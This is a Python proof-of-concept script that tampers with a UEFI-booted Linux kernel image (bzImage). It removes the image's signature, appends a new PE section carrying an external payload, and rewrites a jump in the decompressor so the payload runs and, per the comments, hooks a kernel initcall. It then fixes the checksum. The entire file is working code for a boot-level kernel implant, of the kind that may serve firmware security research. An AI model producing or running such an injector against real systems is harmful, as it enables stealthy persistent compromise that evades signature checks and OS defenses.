"""
PoC to patch a bzImage, only for uefi as we are hooking the the uefi functions
and rely on being able to create more sections.
"""
import sys
import math
import struct
import pefile
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT
from binsearch import FixedBytes, SkipBytes, BinSearch
from pe import PERemoveSig, PECheckSumFix


def assemble(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    ks.syntax = KS_OPT_SYNTAX_ATT
    encoding, count = ks.asm(code)
    return bytes(encoding)


def pad(data, padding=4096, before=False, value=b'\x00'):
    extra = padding - (len(data) % padding)

    if before:
        return extra * value + data

    return data + extra * value


def to_page_count(value, page_size=4096):
    return math.ceil(value / page_size)


def add_data(pe_data_orig, data):
    to_add = pad(data, 4096)

    pe = pefile.PE(data=pe_data_orig)
    # Now we update the headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage += len(to_add)
    pe.OPTIONAL_HEADER.SizeOfCode = pe.OPTIONAL_HEADER.SizeOfImage
    pe_data = bytearray(pe.write())

    # Update the last sections sizeOfRawData to be equal to its virtualSize
    curr_virtual_size = pe_data[0x178:0x178+4]
    curr_real_size = pe_data[0x180:0x180+4]
    pe_data[0x180:0x180+4] = curr_virtual_size

    to_pad_with = struct.unpack('<I', curr_virtual_size)[0] - \
        struct.unpack('<I', curr_real_size)[0]
    pe_data += b'\x00' * to_pad_with

    # add the data we are appending
    offset = len(pe_data)
    pe_data += to_add

    # Create new section
    pe_data[0x198:0x198 + 0x28] = pe_data[0x148:0x148 + 0x28]

    # name
    pe_data[0x198:0x198 + 8] = b'.patch\x00\x00'

    # virtualSize
    pe_data[0x1a0:0x1a0 + 4] = struct.pack('<I', len(to_add))
    # rva
    pe_data[0x1a4:0x1a4 + 4] = struct.pack('<I', offset)
    # size of raw data
    pe_data[0x1a8:0x1a8 + 4] = struct.pack('<I', len(to_add))
    # ptr raw data
    pe_data[0x1ac:0x1ac + 4] = struct.pack('<I', offset)

    # Replacing a jump, trashing some error handling code that shouldn't really
    # happen.

    # mov rsi, rbx
    # add rax, rcx
    # jmp rax
    bs = BinSearch([FixedBytes(b'\x48\x89\xDE\x48\x01\xC8\xFF\xE0')])
    matches = bs.search(pe_data)

    assert(len(matches) == 1)

    target_jump_offset = matches[0][0]
    dist = offset - target_jump_offset
    # note: we need to do the instructions we replaced in the next stage!!!
    transfer = pad(assemble(f'jmp {hex(dist)}'), 8, before=True, value=b'\x90')
    pe_data[target_jump_offset:target_jump_offset+8] = transfer

    # Patching for BIOS
    bs = BinSearch([
        FixedBytes(b'\xe8'),
        SkipBytes(4),
        FixedBytes(b'\x4c\x89\xfe\xff\xe0')
    ])
    matches = bs.search(pe_data)
    assert(len(matches) == 1)

    # we'll be jumping back down to an old mapping at a fixed address.
    pe_data[matches[0][0]:matches[0][0]+2] = b'\xeb\xfe'
    # pe_data[0x5000:0x5000+2] = b'\xeb\xfe'
    print(matches[0][0], offset)

    return pe_data


def main():
    a = open(sys.argv[1], 'rb').read()

    # remove the sig
    a = PERemoveSig(a).remove_sig()

    # Adding our payload
    # this is the first stage that will patch the kernel after its been
    # decompressed, hooking an initcall and making sure our payload exists in
    # virtual memory.
    payload = open('./payload/all.bin', 'rb').read()
    a = add_data(
        a,
        pad(payload, before=True, value=b'\x90')
    )

    # Checksum fixes for sanity
    last = PECheckSumFix(a).fix()
    open(sys.argv[2], 'wb').write(last)


if __name__ == "__main__":
    main()
